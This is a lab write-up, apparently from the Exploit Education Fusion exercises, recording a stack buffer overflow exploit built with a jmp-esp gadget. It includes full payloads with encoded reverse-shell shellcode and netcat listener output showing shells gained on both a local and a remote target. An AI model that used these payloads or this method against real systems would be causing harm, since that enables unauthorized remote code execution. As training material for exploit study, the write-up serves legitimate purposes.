#######################
General
#######################
Same exploit as last time, but this time with ASLR. Also the debug symbol isn't shown.

The executable isn't a PIE, so we should be able to use ROP to get code execution.

#######################
Local exploitation
#######################
Let's try on the local version first.

Compiled it statically to make sure we have lots of ROP options:
gcc target.c -o target -static -m32

Fuzzing the application for vulns, seeing what state the registers are in when the segfault occurs:
```
r2 -A -d target 
doo "GET /AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA HTTP/1.1"
```

Looks like the whole ESP region is overwritten with our payload, which makes sense:
```
[0x08049f15]> pxr 16 @ esp - 8
0xfff52ce4 0x41414141  AAAA ebx,ebp ascii ('A')
0xfff52ce8 0x41414141  AAAA ebx,ebp ascii ('A')
0xfff52cec 0x41414141  AAAA @ esp ebx,ebp ascii ('A')
0xfff52cf0 0x41414141  AAAA ebx,ebp ascii ('A')
```

Let's find a ROP gadget that jumps to ESP:
```
msfelfscan target -j esp
```
We get a bunch of results, but a lot of them are probably in non-executable memory regions.

Let's see which memory regions are executable:
```
readelf target --segments
Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
LOAD           0x001000 0x08049000 0x08049000 0x6d444 0x6d444 R E 0x1000
```

Only 0x08049000 - 0x80B6444 is executable. Anything outside that range is useless.

Let's filter out the wrong lines with awk:
```
msfelfscan target -j esp | awk '{
if (strtonum($1) >= 0x08049000 && strtonum($1) <= 0x080b6444)
	print $0
}'


0x08064c48 push esp; retn 0xffff
0x0807d17c push esp; ret
0x0807d1b4 push esp; ret
0x080a3a6f push esp; ret
0x080b39c6 push esp; ret
0x08064c48 push esp; retn 0xffff
0x0807d17c push esp; ret
0x0807d1b4 push esp; ret
0x080a3a6f push esp; ret
0x080b39c6 push esp; ret
```

Found out I need 139 bytes of overflow using a cyclical generator (fuzz.py).


Testing (getting a segfault but expected an infinite loop due to pwn.shellcraft.i386.infloop()):
./target "$(echo -n -e "\x47\x45\x54\x20\x2f\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\xeb\xfe\x7c\xc1\x7\x8\x20\x48\x54\x54\x50\x2f\x31\x2e\x31\x20\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xbb\x44\xd1\xd\x1d\xdd\xc7\xd9\x74\x24\xf4\x5d\x31\xc9\xb1\x12\x31\x5d\x12\x83\xc5\x4\x3\x19\xdf\xef\xe8\x90\x4\x18\xf1\x81\xf9\xb4\x9c\x27\x77\xdb\xd1\x41\x4a\x9c\x81\xd4\xe4\xa2\x68\x66\x4d\xa4\x8b\xe\x8e\xfe\x6a\xcf\x66\xfd\x72\xd0\x36\x88\x92\x5e\xd0\xda\x5\xcd\xae\xd8\x2c\x10\x1d\x5e\x7c\xba\xf0\x70\xf2\x52\x65\xa0\xdb\xc0\x1c\x37\xc0\x56\x8c\xce\xe6\xe6\x39\x1c\x68")"


Let's debug with radare2.
First, create a gdbserver because radare2 is an unreliable mess:
gdbserver 0.0.0.0:22222 ./target "$(perl -e 'print "\x47\x45\x54\x20\x2f\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\xeb\xfe\x7c\xc1\x7\x8\x20\x48\x54\x54\x50\x2f\x31\x2e\x31\x20\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xbb\x44\xd1\xd\x1d\xdd\xc7\xd9\x74\x24\xf4\x5d\x31\xc9\xb1\x12\x31\x5d\x12\x83\xc5\x4\x3\x19\xdf\xef\xe8\x90\x4\x18\xf1\x81\xf9\xb4\x9c\x27\x77\xdb\xd1\x41\x4a\x9c\x81\xd4\xe4\xa2\x68\x66\x4d\xa4\x8b\xe\x8e\xfe\x6a\xcf\x66\xfd\x72\xd0\x36\x88\x92\x5e\xd0\xda\x5\xcd\xae\xd8\x2c\x10\x1d\x5e\x7c\xba\xf0\x70\xf2\x52\x65\xa0\xdb\xc0\x1c\x37\xc0\x56\x8c\xce\xe6\xe6\x39\x1c\x68"')"

Then, connect using radare2:
r2 -d gdb://localhost:22222

We're getting a segfault in the realpath function for some reason. Time to simplify the payload.
After simplifying, realpath no longer crashes
But something else does... FUCK

Also radare2 is getting annoying. Let's switch to GDB.
And it works in GDB without gdbserver? Oh well...

Using GDB, we can see that the exploit correctly goes to the rop gadget address.
The ROP gadget address contains push esp, ret as expected and goes to the stack.

It looks like the problem is that we are corrupting our own shellcode with the ROP gadget.
Actually, no, we land on the AFTER the return address overwrite, not before! (because the stack grows towards lower addresses)
So really, we needed to put our infinite loop after the return address overwrite, not before it!

Well, when I tried it, then we also got a segfault...
Oh well, let's debug it next time and try to understand what went wrong

VERY IMPORTANT! MAKE SURE THE LEETSHEET IS CORRECT ONCE YOU FIGURE THIS OUT!

#######################
#######################
Day 2
#######################
#######################

Confirmed, we're landing right after the return address.
OOOOOOH I get it, I think the stack is compiled to not be executable

Yep, how stupid am I?
[*] '/home/x90slide/exercises/exploit_education/fusion/level1/local/target'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)

Though it's interesting that I didn't stumble into stack canaries, even though they were enabled????

Anyways, compile the target again:
gcc target.c -o target -static -m32 -fno-stack-protector -z execstack


Yep, now the exploit works. Hangs infinitely (on purpose) when running the following payload:
gdb --args ./target "$(perl -e 'print "\x47\x45\x54\x20\x2f\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x7c\xc1\x7\x8\x90\x90\x90\x90\x90\x90\x90\x90\xeb\xfe\xeb\xfe\x20\x48\x54\x54\x50\x2f\x31\x2e\x31"')"

OK so now I've added the nopslide and the shellcode but what's interesting is that for some reason our nopslide ends and the same buffer starts again. I'm assuming the other buffer overwrites our overflown buffer somehow, not sure why. So after our jump, we land in the middle of the A's. But that's probably fine, since the A's won't cause the program to break and we'll probably get to another jump and our shellcode eventually.

Edit: well, almost. We'll also have to add a jump before the return address, lol.


Aaaaand it worked!
Here's the final payload for the local application:
```
./target "$(perl -e 'print "\x47\x45\x54\x20\x2f\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\x41\xeb\x4e\x7c\xc1\x7\x8\xeb\x4e\x20\x48\x54\x54\x50\x2f\x31\x2e\x31\x20\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\x90\xbb\x44\xd1\xd\x1d\xdd\xc7\xd9\x74\x24\xf4\x5d\x31\xc9\xb1\x12\x31\x5d\x12\x83\xc5\x4\x3\x19\xdf\xef\xe8\x90\x4\x18\xf1\x81\xf9\xb4\x9c\x27\x77\xdb\xd1\x41\x4a\x9c\x81\xd4\xe4\xa2\x68\x66\x4d\xa4\x8b\xe\x8e\xfe\x6a\xcf\x66\xfd\x72\xd0\x36\x88\x92\x5e\xd0\xda\x5\xcd\xae\xd8\x2c\x10\x1d\x5e\x7c\xba\xf0\x70\xf2\x52\x65\xa0\xdb\xc0\x1c\x37\xc0\x56\x8c\xce\xe6\xe6\x39\x1c\x68"')"
```


Proof:
```
┌──(x90slide㉿kali)-[~/…/exploit_education/fusion/level1/local]
└─$ nc -lnvp 8000
listening on [any] 8000 ...
connect to [192.168.6.1] from (UNKNOWN) [192.168.6.1] 47118

whoami
x90slide
```

#######################
Remote
#######################
Ok, now it's time to exploit the same thing remotely. 

Things to verify:
*) bytes to stored eip didn't change
*) jump length is still OK

Things to change:
*) New ROP gadget address
*) Convert script to remote 
*) Test out changes in GDB using gdbserver


Confirmed the binary that's being run:
```
root@fusion:/proc/1285# readlink -f exe
/opt/fusion/bin/level01
```


Let's get the executable segments:
```
readelf target --segments
  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
  PHDR           0x000034 0x08048034 0x08048034 0x00100 0x00100 R E 0x4
  LOAD           0x000000 0x08048000 0x08048000 0x022bc 0x022bc R E 0x1000
  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x4
```

Two segments (plus the stack):
	1. 0x08048034 - 0x8048134
	2. 0x08048000 - 0x804A2BC

Segment #2 completely contains segment #1, so we only have to look at the range of segment 2

Let's filter out the wrong lines with awk:
```
┌──(x90slide㉿kali)-[~/…/exploit_education/fusion/level1/local]
└─$ ssh fusion '/opt/metasploit-framework/msfelfscan /opt/fusion/bin/level01 -j esp' | awk '{
if (strtonum($1) >= 0x08048000 && strtonum($1) <= 0x804A2BC)
        print $0
}'

0x08049f4f jmp esp
```

So 0x08049f4f is our gadget.


Lol, all I had to do was change the gadget address and implement network functionality and it started working!
Proof:
```
┌──(x90slide㉿kali)-[~/exercises/exploit_education/fusion/level1]
└─$ nc -lnvp 8000
listening on [any] 8000 ...
connect to [192.168.6.1] from (UNKNOWN) [192.168.6.2] 38470
whoami
whoami: cannot find name for user ID 20001

```
